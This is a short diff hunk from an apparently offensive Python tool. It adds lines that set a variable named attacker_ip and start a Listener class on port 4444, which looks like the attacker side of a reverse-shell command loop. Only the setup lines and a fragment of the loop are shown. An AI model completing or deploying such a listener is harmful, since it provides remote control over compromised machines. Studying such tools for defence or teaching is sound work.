@@ -39,3 +39,8 @@ class Listener:
             result = self.send_command()
             print(result)
 
+
+
+attacker_ip = "192.168.106.129"
+
+listener = Listener(attacker_ip, 4444)
